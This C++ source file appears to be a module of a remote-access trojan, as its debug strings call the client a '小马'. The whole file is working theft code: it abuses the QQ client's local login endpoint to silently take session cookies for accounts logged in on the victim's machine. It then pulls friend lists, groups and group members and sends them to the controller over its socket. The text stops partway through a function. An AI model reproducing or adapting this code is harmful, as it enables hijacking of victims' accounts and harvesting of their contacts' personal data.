// GetQQInfo.cpp: implementation of the CGetQQInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "QQInfoManager.h"
#include <stdio.h>
#include <stdlib.h>
#include <WinInet.h>
#pragma comment(lib,"Wininet.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CQQInfoManager::CQQInfoManager(CClientSocket *pClient) : CManager(pClient)
{
	BYTE	bToken = TOKEN_QQINFO;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	SendQQLocalJson();
}

CQQInfoManager::~CQQInfoManager()
{

}

void CQQInfoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	OutputDebugString("小马接受到好友信息命令");
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_QQDATA:
		SendQQLocalJson();
		break;
	}
}

BOOL CQQInfoManager::SendQQLocalJson()
{
	OutputDebugString("开始获取好友信息");

	BOOL bResult = FALSE;
	cJSON *pQQLocalJson = GetQQLocalJson();
	if (pQQLocalJson == NULL)
	{
		BYTE	bToken = TOKEN_QQDATA;
		return Send((LPBYTE)&bToken, 1);
	}
	OutputDebugString("开始获取好友信息1");
	char *szQQLocalJson = cJSON_PrintUnformatted(pQQLocalJson);
	if (szQQLocalJson == NULL)
	{
		cJSON_Delete(pQQLocalJson);
		BYTE	bToken = TOKEN_QQDATA;
		return Send((LPBYTE)&bToken, 1);
	}
	OutputDebugString("开始获取好友信息2");
	cJSON_Delete(pQQLocalJson);
	UINT nSize = strlen(szQQLocalJson) + 1;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, nSize + 1);
	lpBuffer[0] = TOKEN_QQDATA;
	memcpy(lpBuffer + 1, szQQLocalJson, nSize);
	free(szQQLocalJson);
	bResult = Send((LPBYTE)lpBuffer, nSize + 1);
	LocalFree(lpBuffer);
	return bResult;
	OutputDebugString("开始获取好友信息3");
}

BOOL CQQInfoManager::GetQQCookieInfo(char *szNumber, char *szToken, char *szInCookie, char *szOutCookie, size_t stOutSize)
{
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	char *szRawHeaders1 = NULL;
	DWORD dwRawHeaders1 = 0;
	char szCookieData1[2048];
	char *szRawHeaders2 = NULL;
	DWORD dwRawHeaders2 = 0;
	char szCookieData2[2048];
	char *szRawHeaders3 = NULL;
	DWORD dwRawHeaders3 = 0;
	char szCookieData3[2048];
	char *pLPosition = NULL;
	char *pRPosition = NULL;
	char szSizeBuffer2[32];
	DWORD dwSizeBuffer2 = sizeof(szSizeBuffer2);
	char *szUtf8Buffer2;
	DWORD dwUtf8Buffer2;
	DWORD dwBytesRead;

	char szGenAgent[] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
	char szSerName1[] = "localhost.ptlogin2.qq.com";
	char szGetName1[2048];
	char szHeaders1[2048];
	char szSerName2[] = "ssl.ptlogin2.qq.com";
	char szGetName2[2048];
	char szHeaders2[2048];
	char szSerName3[] = "ptlogin2.qun.qq.com";
	char szGetName3[2048];
	char szHeaders3[2048];

	// 1.根据指定的QQ号码和szInCookie解析Cookie到szCookieData1
	memset(szOutCookie, 0, stOutSize); // 置零要输出的szOutCookie
	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hConnect = InternetConnect(hInternet, szSerName1, 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	sprintf(szGetName1, "/pt_get_st?clientuin=%s&callback=ptui_getst_CB&r=%.16f&%s", szNumber, 0.9475416028552021, szToken);
	hRequest = HttpOpenRequest(hConnect, "GET", szGetName1, "HTTP/1.1", NULL, NULL, 0x80880010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	sprintf(szHeaders1, "Accept: */*\r\nReferer: https://localhost.ptlogin2.qq.com:4301%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szGetName1, szInCookie);
	if (!HttpSendRequest(hRequest, szHeaders1, strlen(szHeaders1), NULL, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders1, &dwRawHeaders1, 0);
	szRawHeaders1 = new char[dwRawHeaders1 + 1];
	memset(szRawHeaders1, 0, dwRawHeaders1 + 1);
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders1, &dwRawHeaders1, 0))
	{
		delete[] szRawHeaders1;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	memset(szCookieData1, 0, sizeof(szCookieData1));
	pLPosition = strstr(szRawHeaders1, "Set-Cookie: ");
	if (pLPosition == NULL)
	{
		delete[] szRawHeaders1;
		return FALSE;
	}
	while (pLPosition)
	{
		pRPosition = strstr(pLPosition, ";");
		strncat(szCookieData1, pLPosition + 12, pRPosition - pLPosition - 12 + 1);
		pLPosition = strstr(pRPosition, "Set-Cookie: ");
	}
	delete[] szRawHeaders1;

	// 2.根据指定的QQ号码和(szCookieData1与szInCookie)解析Cookie到szCookieData2
	strcat(szCookieData1, szInCookie); // 合并szInCookie到szCookieData1
	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hConnect = InternetConnect(hInternet, szSerName2, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	sprintf(szGetName2, "/jump?clientuin=%s&keyindex=9&pt_aid=715030901&daid=73&u1=http%%3A%%2F%%2Fqun.qq.com%%2Fmember.html%%23&%s&pt_3rd_aid=0&ptopt=1&style=40", szNumber, szToken);
	hRequest = HttpOpenRequest(hConnect, "GET", szGetName2, "HTTP/1.1", NULL, NULL, 0x80880010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	sprintf(szHeaders2, "Accept: */*\r\nReferer: https://ssl.ptlogin2.qq.com%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szGetName2, szCookieData1);
	if (!HttpSendRequest(hRequest, szHeaders2, strlen(szHeaders2), NULL, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders2, &dwRawHeaders2, 0);
	szRawHeaders2 = new char[dwRawHeaders2 + 1];
	memset(szRawHeaders2, 0, dwRawHeaders2 + 1);
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders2, &dwRawHeaders2, 0))
	{
		delete[] szRawHeaders2;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer2, &dwSizeBuffer2, 0))
	{
		delete[] szRawHeaders2;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	dwUtf8Buffer2 = atol(szSizeBuffer2) + 1;
	szUtf8Buffer2 = new char[dwUtf8Buffer2];
	memset(szUtf8Buffer2, 0, dwUtf8Buffer2);
	if (!InternetReadFile(hRequest, szUtf8Buffer2, dwUtf8Buffer2, &dwBytesRead))
	{
		delete[] szUtf8Buffer2;
		delete[] szRawHeaders2;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	memset(szCookieData2, 0, sizeof(szCookieData2));
	pLPosition = strstr(szRawHeaders2, "Set-Cookie: ");
	if (pLPosition == NULL)
	{
		delete[] szUtf8Buffer2;
		delete[] szRawHeaders2;
		return FALSE;
	}
	while (pLPosition)
	{
		pRPosition = strstr(pLPosition, ";");
		if (strstr(pLPosition, "=") + 1 != pRPosition)
			strncat(szCookieData2, pLPosition + 12, pRPosition - pLPosition - 12 + 1);
		pLPosition = strstr(pRPosition, "Set-Cookie: ");
	}
	delete[] szRawHeaders2;
	memset(szGetName3, 0, sizeof(szGetName3));
	pLPosition = strstr(szUtf8Buffer2, "/check_sig?");
	if (pLPosition == NULL)
	{
		delete[] szUtf8Buffer2;
		return FALSE;
	}
	pRPosition = strstr(pLPosition, "',");
	strncpy(szGetName3, pLPosition, pRPosition - pLPosition);
	delete[] szUtf8Buffer2;

	// 3.根据指定的QQ号码和szCookieData2解析Cookie到szCookieData3
	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hConnect = InternetConnect(hInternet, szSerName3, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	hRequest = HttpOpenRequest(hConnect, "GET", szGetName3, "HTTP/1.1", NULL, NULL, 0x80284010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	sprintf(szHeaders3, "Accept: */*\r\nReferer: http://ptlogin2.qun.qq.com%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szGetName3, szCookieData2);
	if (!HttpSendRequest(hRequest, szHeaders3, strlen(szHeaders3), NULL, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders3, &dwRawHeaders3, 0);
	szRawHeaders3 = new char[dwRawHeaders3 + 1];
	memset(szRawHeaders3, 0, dwRawHeaders3 + 1);
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders3, &dwRawHeaders3, 0))
	{
		delete[] szRawHeaders3;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	memset(szCookieData3, 0, sizeof(szCookieData3));
	pLPosition = strstr(szRawHeaders3, "Set-Cookie: ");
	if (pLPosition == NULL)
	{
		delete[] szRawHeaders3;
		return FALSE;
	}
	while (pLPosition)
	{
		pRPosition = strstr(pLPosition, ";");
		if (strstr(pLPosition, "=") + 1 != pRPosition)
			strncat(szCookieData3, pLPosition + 12, pRPosition - pLPosition - 12 + 1);
		pLPosition = strstr(pRPosition, "Set-Cookie: ");
	}
	delete[] szRawHeaders3;

	// 4.根据指定的QQ号码和szCookieData3输出Cookie到szOutCookie
	strcat(szOutCookie, szCookieData3);
	return strlen(szOutCookie);
}

cJSON* CQQInfoManager::GetQQFriendJson(char *szInCookie)
{
	cJSON *pQQFriendJson = NULL;
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	char *pLPosition = NULL;
	char *pRPosition = NULL;

	char szSizeBuffer1[32];
	DWORD dwSizeBuffer1 = sizeof(szSizeBuffer1);
	char *szUtf8Buffer1;
	DWORD dwUtf8Buffer1;
	WCHAR *szWideBuffer1;
	DWORD dwWideBuffer1;
	char *szAnsiBuffer1;
	DWORD dwAnsiBuffer1;
	DWORD dwBytesRead;

	char szGenAgent[] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
	char szSerName1[] = "qun.qq.com";
	char szPostName1[] = "/cgi-bin/qun_mgr/get_friend_list";
	char szHeaders1[2048];
	char szPostData1[64];

	if (strstr(szInCookie, "p_skey") == NULL)
		return pQQFriendJson;
	pLPosition = strstr(szInCookie, "skey=");
	if (pLPosition == NULL)
		return pQQFriendJson;
	pRPosition = strstr(pLPosition, ";");
	memset(szPostData1, 0, sizeof(szPostData1));
	strcat(szPostData1, "bkn=");
	strncpy(szPostData1 + 4, pLPosition + 5, pRPosition - pLPosition - 5);
	int nLen = strlen(szPostData1) - 4;
	int nBaseKey = 5381;
	for (int i = 0; i<nLen; i++)
	{
		nBaseKey = nBaseKey + (nBaseKey << 5) + szPostData1[i + 4];
	}
	itoa(nBaseKey & 2147483647, szPostData1 + 4, 10);

	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return pQQFriendJson;
	hConnect = InternetConnect(hInternet, szSerName1, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return pQQFriendJson;
	}
	hRequest = HttpOpenRequest(hConnect, "POST", szPostName1, "HTTP/1.1", NULL, NULL, 0x80084010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQFriendJson;
	}
	sprintf(szHeaders1, "Accept: */*\r\nReferer: http://qun.qq.com%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szPostName1, szInCookie);
	if (!HttpSendRequest(hRequest, szHeaders1, strlen(szHeaders1), szPostData1, strlen(szPostData1)))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQFriendJson;
	}
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer1, &dwSizeBuffer1, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQFriendJson;
	}
	dwUtf8Buffer1 = atol(szSizeBuffer1) + 1;
	szUtf8Buffer1 = new char[dwUtf8Buffer1];
	memset(szUtf8Buffer1, 0, dwUtf8Buffer1);
	if (!InternetReadFile(hRequest, szUtf8Buffer1, dwUtf8Buffer1, &dwBytesRead))
	{
		delete[] szUtf8Buffer1;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQFriendJson;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	dwWideBuffer1 = MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, NULL, 0);
	szWideBuffer1 = new WCHAR[dwWideBuffer1 + 1];
	memset(szWideBuffer1, 0, dwWideBuffer1 * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, szWideBuffer1, dwWideBuffer1);
	delete[] szUtf8Buffer1;
	dwAnsiBuffer1 = WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, NULL, 0, NULL, NULL);
	szAnsiBuffer1 = new char[dwAnsiBuffer1 + 1];
	memset(szAnsiBuffer1, 0, dwAnsiBuffer1 * 1 + 1);
	WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, szAnsiBuffer1, dwAnsiBuffer1, NULL, NULL);
	delete[] szWideBuffer1;

	// 解析JSON格式数据包
	pQQFriendJson = cJSON_Parse(szAnsiBuffer1);
	delete[] szAnsiBuffer1;
	return pQQFriendJson;
}

cJSON* CQQInfoManager::GetQQGroupMemberJson(char *szInCookie, char *szPostData)
{
	cJSON *gmr = NULL;
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;

	char szSizeBuffer1[32];
	DWORD dwSizeBuffer1 = sizeof(szSizeBuffer1);
	char *szUtf8Buffer1;
	DWORD dwUtf8Buffer1;
	WCHAR *szWideBuffer1;
	DWORD dwWideBuffer1;
	char *szAnsiBuffer1;
	DWORD dwAnsiBuffer1;
	DWORD dwBytesRead;

	char szGenAgent[] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
	char szSerName1[] = "qun.qq.com";
	char szPostName1[] = "/cgi-bin/qun_mgr/search_group_members";
	char szHeaders1[2048];

	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return gmr;
	hConnect = InternetConnect(hInternet, szSerName1, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return gmr;
	}
	hRequest = HttpOpenRequest(hConnect, "POST", szPostName1, "HTTP/1.1", NULL, NULL, 0x80084010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return gmr;
	}
	sprintf(szHeaders1, "Accept: */*\r\nReferer: http://qun.qq.com%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szPostName1, szInCookie);
	if (!HttpSendRequest(hRequest, szHeaders1, strlen(szHeaders1), szPostData, strlen(szPostData)))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return gmr;
	}
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer1, &dwSizeBuffer1, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return gmr;
	}
	dwUtf8Buffer1 = atol(szSizeBuffer1) + 1;
	szUtf8Buffer1 = new char[dwUtf8Buffer1];
	memset(szUtf8Buffer1, 0, dwUtf8Buffer1);
	if (!InternetReadFile(hRequest, szUtf8Buffer1, dwUtf8Buffer1, &dwBytesRead))
	{
		delete[] szUtf8Buffer1;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return gmr;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	dwWideBuffer1 = MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, NULL, 0);
	szWideBuffer1 = new WCHAR[dwWideBuffer1 + 1];
	memset(szWideBuffer1, 0, dwWideBuffer1 * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, szWideBuffer1, dwWideBuffer1);
	delete[] szUtf8Buffer1;
	dwAnsiBuffer1 = WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, NULL, 0, NULL, NULL);
	szAnsiBuffer1 = new char[dwAnsiBuffer1 + 1];
	memset(szAnsiBuffer1, 0, dwAnsiBuffer1 * 1 + 1);
	WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, szAnsiBuffer1, dwAnsiBuffer1, NULL, NULL);
	delete[] szWideBuffer1;

	// 解析JSON格式数据包
	gmr = cJSON_Parse(szAnsiBuffer1);
	delete[] szAnsiBuffer1;
	return gmr;
}

cJSON* CQQInfoManager::GetQQGroupJson(char *szInCookie)
{
	cJSON *pQQGroupJson = NULL;
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	char *pLPosition = NULL;
	char *pRPosition = NULL;

	char szSizeBuffer1[32];
	DWORD dwSizeBuffer1 = sizeof(szSizeBuffer1);
	char *szUtf8Buffer1;
	DWORD dwUtf8Buffer1;
	WCHAR *szWideBuffer1;
	DWORD dwWideBuffer1;
	char *szAnsiBuffer1;
	DWORD dwAnsiBuffer1;
	DWORD dwBytesRead;
	cJSON *ec;
	cJSON *create;
	cJSON *join;
	cJSON *gc;
	cJSON *gmr;

	char szGenAgent[] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
	char szSerName1[] = "qun.qq.com";
	char szPostName1[] = "/cgi-bin/qun_mgr/get_group_list";
	char szHeaders1[2048];
	char szPostData1[128];
	char szPostData2[128];

	if (strstr(szInCookie, "p_skey") == NULL)
		return pQQGroupJson;
	pLPosition = strstr(szInCookie, "skey=");
	if (pLPosition == NULL)
		return pQQGroupJson;
	pRPosition = strstr(pLPosition, ";");
	memset(szPostData1, 0, sizeof(szPostData1));
	strcat(szPostData1, "bkn=");
	strncpy(szPostData1 + 4, pLPosition + 5, pRPosition - pLPosition - 5);
	int nLen = strlen(szPostData1) - 4;
	int nBaseKey = 5381;
	for (int i = 0; i<nLen; i++)
	{
		nBaseKey = nBaseKey + (nBaseKey << 5) + szPostData1[i + 4];
	}
	itoa(nBaseKey & 2147483647, szPostData1 + 4, 10);

	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return pQQGroupJson;
	hConnect = InternetConnect(hInternet, szSerName1, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return pQQGroupJson;
	}
	hRequest = HttpOpenRequest(hConnect, "POST", szPostName1, "HTTP/1.1", NULL, NULL, 0x80084010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQGroupJson;
	}
	sprintf(szHeaders1, "Accept: */*\r\nReferer: http://qun.qq.com%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szPostName1, szInCookie);
	if (!HttpSendRequest(hRequest, szHeaders1, strlen(szHeaders1), szPostData1, strlen(szPostData1)))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQGroupJson;
	}
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer1, &dwSizeBuffer1, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQGroupJson;
	}
	dwUtf8Buffer1 = atol(szSizeBuffer1) + 1;
	szUtf8Buffer1 = new char[dwUtf8Buffer1];
	memset(szUtf8Buffer1, 0, dwUtf8Buffer1);
	if (!InternetReadFile(hRequest, szUtf8Buffer1, dwUtf8Buffer1, &dwBytesRead))
	{
		delete[] szUtf8Buffer1;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQGroupJson;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	dwWideBuffer1 = MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, NULL, 0);
	szWideBuffer1 = new WCHAR[dwWideBuffer1 + 1];
	memset(szWideBuffer1, 0, dwWideBuffer1 * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer1, -1, szWideBuffer1, dwWideBuffer1);
	delete[] szUtf8Buffer1;
	dwAnsiBuffer1 = WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, NULL, 0, NULL, NULL);
	szAnsiBuffer1 = new char[dwAnsiBuffer1 + 1];
	memset(szAnsiBuffer1, 0, dwAnsiBuffer1 * 1 + 1);
	WideCharToMultiByte(CP_ACP, 0, szWideBuffer1, -1, szAnsiBuffer1, dwAnsiBuffer1, NULL, NULL);
	delete[] szWideBuffer1;

	// 解析JSON格式数据包
	pQQGroupJson = cJSON_Parse(szAnsiBuffer1);
	delete[] szAnsiBuffer1;
	if (pQQGroupJson == NULL)
		return pQQGroupJson;
	ec = cJSON_GetObjectItem(pQQGroupJson, "ec");
	if (ec == NULL)
	{
		cJSON_Delete(pQQGroupJson);
		pQQGroupJson = NULL;
		return pQQGroupJson;
	}
	if (ec->valueint != 0)
	{
		cJSON_Delete(pQQGroupJson);
		pQQGroupJson = NULL;
		return pQQGroupJson;
	}
	create = cJSON_GetObjectItem(pQQGroupJson, "create");
	join = cJSON_GetObjectItem(pQQGroupJson, "join");
	if (create == NULL && join == NULL)
	{
		cJSON_Delete(pQQGroupJson);
		pQQGroupJson = NULL;
		return pQQGroupJson;
	}
	if (create != NULL)
	{
		for (create = create->child; create; create = create->next)
		{
			gc = cJSON_GetObjectItem(create, "gc");
			if (gc == NULL)
				continue;
			sprintf(szPostData2, "gc=%u&st=0&end=1999&sort=0&%s", gc->valueint, szPostData1);
			gmr = GetQQGroupMemberJson(szInCookie, szPostData2);
			if (gmr != NULL)
				cJSON_AddItemToObject(create, "gmr", gmr);
		}
	}
	if (join != NULL)
	{
		for (join = join->child; join; join = join->next)
		{
			gc = cJSON_GetObjectItem(join, "gc");
			if (gc == NULL)
				continue;
			sprintf(szPostData2, "gc=%u&st=0&end=1999&sort=0&%s", gc->valueint, szPostData1);
			gmr = GetQQGroupMemberJson(szInCookie, szPostData2);
			if (gmr != NULL)
				cJSON_AddItemToObject(join, "gmr", gmr);
		}
	}
	return pQQGroupJson;
}

cJSON* CQQInfoManager::GetQQLocalJson()
{
	cJSON *pQQLocalJson = NULL;
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	char *szRawHeaders1 = NULL;
	DWORD dwRawHeaders1 = 0;
	char szCookieData1[2048];
	char szCookieData2[2048];
	char *pLPosition = NULL;
	char *pRPosition = NULL;
	char pt_local_tk[64] = { 0 };
	char szSizeBuffer2[32];
	DWORD dwSizeBuffer2 = sizeof(szSizeBuffer2);
	char *szUtf8Buffer2;
	DWORD dwUtf8Buffer2;
	WCHAR *szWideBuffer2;
	DWORD dwWideBuffer2;
	char *szAnsiBuffer2;
	DWORD dwAnsiBuffer2;
	DWORD dwBytesRead;
	cJSON *user;
	cJSON *pQQFriendJson;
	cJSON *pQQGroupJson;

	char szGenAgent[] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
	char szSerName1[] = "xui.ptlogin2.qq.com";
	char szGetName1[] = "/cgi-bin/xlogin?appid=715030901&daid=73&hide_close_icon=1&pt_no_auth=1&s_url=http%3A%2F%2Fqun.qq.com%2Fmember.html%23";
	char szHeaders1[] = "Accept: */*\r\nReferer: https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&daid=73&hide_close_icon=1&pt_no_auth=1&s_url=http%3A%2F%2Fqun.qq.com%2Fmember.html%23\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded";
	char szSerName2[] = "localhost.ptlogin2.qq.com";
	char szGetName2[2048];
	char szHeaders2[2048];

	// 1.解析Cookie到szCookieData1并从Cookie获取pt_local_tk的值(用于传递Url参数)
	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return pQQLocalJson;
	hConnect = InternetConnect(hInternet, szSerName1, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	hRequest = HttpOpenRequest(hConnect, "GET", szGetName1, "HTTP/1.1", NULL, NULL, 0x80880010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	if (!HttpSendRequest(hRequest, szHeaders1, strlen(szHeaders1), NULL, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders1, &dwRawHeaders1, 0);
	szRawHeaders1 = new char[dwRawHeaders1 + 1];
	memset(szRawHeaders1, 0, dwRawHeaders1 + 1);
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, szRawHeaders1, &dwRawHeaders1, 0))
	{
		delete[] szRawHeaders1;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	pLPosition = strstr(szRawHeaders1, "pt_local_token=");
	if (pLPosition == NULL)
	{
		delete[] szRawHeaders1;
		return pQQLocalJson;
	}
	pRPosition = strstr(pLPosition, ";");
	strcat(pt_local_tk, "pt_local_tk=");
	strncpy(pt_local_tk + 12, pLPosition + 15, pRPosition - pLPosition - 15);
	memset(szCookieData1, 0, sizeof(szCookieData1));
	pLPosition = strstr(szRawHeaders1, "Set-Cookie: ");
	if (pLPosition == NULL)
	{
		delete[] szRawHeaders1;
		return pQQLocalJson;
	}
	while (pLPosition)
	{
		pRPosition = strstr(pLPosition, ";");
		strncat(szCookieData1, pLPosition + 12, pRPosition - pLPosition - 12 + 1);
		pLPosition = strstr(pRPosition, "Set-Cookie: ");
	}
	delete[] szRawHeaders1;

	// 2.获取本地登录的QQ昵称和号码列表并输出到vQQLocalInfo
	hInternet = InternetOpen(szGenAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return pQQLocalJson;
	hConnect = InternetConnect(hInternet, szSerName2, 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
